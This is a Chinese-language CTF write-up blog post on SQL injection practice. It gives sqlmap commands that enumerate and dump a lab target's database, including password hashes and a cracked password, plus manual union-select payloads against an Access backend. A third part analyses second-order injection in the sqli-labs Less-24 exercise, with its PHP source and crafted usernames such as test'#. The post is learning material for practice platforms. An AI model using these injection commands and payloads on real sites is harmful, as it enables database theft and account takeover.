---
title: 'sql注入实践'
date: 2019-07-15
updated: 2019-08-21
category: 'ctf'
tags:
  - 'wp'
  - 'ctf'
  - 'sql'
lang: 'zh'
draft: false
---
# 基于sql的盲注

之前一直没有好好地学习过`sqlmap`的使用方法

如果是针对post表单这种方式

1.  可以将抓到的包保存成一个文件，然后使用 `sqlmap.py -r "post.txt" -p n --dbs` 其中`-p`是指定参数
2.  sqlmap也可以自动搜寻表单`sqlmap.py -u "url" --forms`
3.  指定参数

趁机学到了一把`sqlmap`使用  
虽然这个题目是有点。。  
但是注入点的判断也是很重要的

## 爆后端数据库

`python sqlmap.py -u "http://219.153.49.228:40952/new_list.php?id=1"`

![backdatabase](https://i.imgur.com/8EdgoS3.png)

## 爆数据库

`python sqlmap.py -u "http://219.153.49.228:40952/new_list.php?id=1" --dbs`

![](https://i.loli.net/2019/08/11/5vAtbEX6sDcnMYK.png)

## 指定数据库报表爆表

`python sqlmap.py -u "http://219.153.49.228:40952/new_list.php?id=1" --dbs -D stormgroup --tables`

![](https://i.loli.net/2019/08/11/xyn5Y4EqVjtPIRG.png)

## 指定数据库和表爆字段

`python sqlmap.py -u "http://219.153.49.228:40952/new_list.php?id=1" --dbs -D stormgroup -T member --columns`

![column](https://i.imgur.com/nd1VTmg.png)

## 指定数据库，表，字符然后dump出数据

`python sqlmap.py -u "http://219.153.49.228:40952/new_list.php?id=1" --dbs -D stormgroup -T member -C password --dump`  
![member](https://i.imgur.com/iRvoAHX.
![password]\(https://i.imgur.com/B6oLiAA.png)  

```
Database: stormgroup
Table: member
[2 entries]
+-------+----------------------------------+--------+
| name  | password                         | status |
+-------+----------------------------------+--------+
| mozhe | 3114b433dece9180717f2b7de56b28a3 | 0      |
| mozhe | b7a0bebf8287c87253fb2958a390346a | 1      |
+-------+----------------------------------+--------+
```

解密之后是106370  
这样就能登陆后台了  
![houtai](https://i.imgur.com/6KXMijL.png)  
![key0](https://i.imgur.com/yxq3qQi.png)  
太神奇了

参考  
[sqlmap之(六)——POST登陆框注入实战](https://blog.csdn.net/u011781521/article/details/58594941)

# SQL手工注入漏洞测试(Access数据库)

这道题目就有点神奇了

纯靠猜

`order by 4`判断有多少个字段

然后 `new_list.asp?id=1 and exists(select * from admin)`判断是否存在`admin`

![access0](https://i.imgur.com/UmyBe7l.png)  
接下来判断回显位置  
`/new_list.asp?id=1 union select 1,2,3,4 from admin`

![access1](https://i.imgur.com/eyqGQZO.png)  
接下来猜测字段值  
`and exists (select id from admin)`

爆出字段值  
`union select 1,username,passwd,id from admin`  
![access2](https://i.imgur.com/H5rq91S.png)

md5解密一下登陆就行了

[参考](https://blog.csdn.net/qq_39936434/article/details/94718134)

# 二次注入分析

看一下sqli的第24题

可以注册账号进行登陆，登陆之后可以修改密码。

登陆点尝试注入发现被检测到了，注册的时候尝试注册`admin`的账号提示账号已存在

看一下源码(用的docker环境，mysql登陆没有密码)

直接全局搜索`username`

![](https://raw.githubusercontent.com/xinyongpeng/gitpic/master/sqli0.png)

```php
function sqllogin(){

   $username = mysql_real_escape_string($_POST["login_user"]);
   $password = mysql_real_escape_string($_POST["login_password"]);
   $sql = "SELECT * FROM users WHERE username='$username' and password='$password'";
//$sql = "SELECT COUNT(*) FROM users WHERE username='$username' and password='$password'";
   $res = mysql_query($sql) or die('You tried to be real smart, Try harder!!!! :( ');
   $row = mysql_fetch_row($res);
        //print_r($row) ;
   if ($row[1]) {
                        return $row[1];
   } else {
                return 0;
   }

}
```

这里使用了`mysql_real_escape_string`方法转义数据，导致注入无法发生

但是我们尝试注册

在`login_create`中有一处：

```php
root@44662761c057:/var/www/html/Less-24# grep "insert" *
login_create.php:   				$sql = "insert into users ( username, password) values(\"$username\", \"$pass\")";
```

`mysql_escape_string`函数也会转义一些字符比如：

```php
<?php
    $item = "Zak's Laptop";
    $escaped_item = mysql_escape_string($item);
    printf ("Escaped string: %s\n", $escaped_item);
?>
```

得到  
`Escaped string: Zak\'s Laptop`

但是我们尝试注册`test'#`

![](https://raw.githubusercontent.com/xinyongpeng/gitpic/master/sqli1.png)

成功了？  
看下数据库：

```
mysql> select * from users where username="test'#";
+----+----------+----------+
| id | username | password |
+----+----------+----------+
| 15 | test'#   | 123      |
+----+----------+----------+
1 row in set (0.00 sec)
```

很神奇。。

传入的`username`已经被成功转义

![](https://raw.githubusercontent.com/xinyongpeng/gitpic/master/sqli3.png)

学习一下`mysql_query`返回的是一个资源值  
![](https://raw.githubusercontent.com/xinyongpeng/gitpic/master/sqli4.png)

此时构造的sql语句也没问题

![](https://raw.githubusercontent.com/xinyongpeng/gitpic/master/sqli5.png)

然而插入的数据就是有问题

```
mysql> select * from users;
+----+----------+------------+
| id | username | password   |
+----+----------+------------+
|  1 | Dumb     | Dumb       |
|  2 | Angelina | I-kill-you |
|  3 | Dummy    | p@ssword   |
|  4 | secure   | crappy     |
|  5 | stupid   | stupidity  |
|  6 | superman | genious    |
|  7 | batman   | mob!le     |
|  8 | admin    | admin      |
|  9 | admin1   | admin1     |
| 10 | admin2   | admin2     |
| 11 | admin3   | admin3     |
| 12 | dhakkan  | dumbo      |
| 14 | admin4   | admin4     |
| 15 | test'#   | 111        |
+----+----------+------------+
14 rows in set (0.00 sec)
```

这个可真的没办法了。。

有个问题，当我登陆的时候：

sql语句是这样的：  
`"SELECT * FROM users WHERE username='test\'#' and password='111'"`

则此时重置密码

![](https://raw.githubusercontent.com/xinyongpeng/gitpic/master/sqli6.png)

`"UPDATE users SET PASSWORD='' where username='test'#' and password='111' "`

此时我构造用户名`test' union selct * from users #` 登陆的时候的sql语句如下

`"SELECT * FROM users WHERE username='test\' union selct * from users #' and password='111'"`

此时还是无法直接注入的，因为单引号被转义无法闭合
